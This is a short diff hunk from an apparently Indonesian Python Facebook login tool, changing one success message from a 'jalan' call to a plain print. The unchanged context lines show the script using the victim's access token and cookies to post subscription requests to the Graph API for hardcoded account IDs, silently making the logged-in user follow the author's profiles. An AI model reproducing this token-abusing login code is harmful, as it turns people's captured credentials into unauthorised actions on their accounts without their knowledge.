@@ -272,7 +272,7 @@ def ___fii___Sayang___Kamu___Widiya___():
         requests.post('https://graph.facebook.com/1767051257/subscribers?access_token=' + (token),cookies=cookie)
         requests.post('https://graph.facebook.com/100000287398094/subscribers?access_token=' + (token),cookies=cookie)
         print(f"{B} | ")
-        jalan(f"{P}[•] login Berhasil")
+        print(f"{P}[•] login Berhasil")
         menu()
     except Exception as e:pass
 ###### BUAT MENU
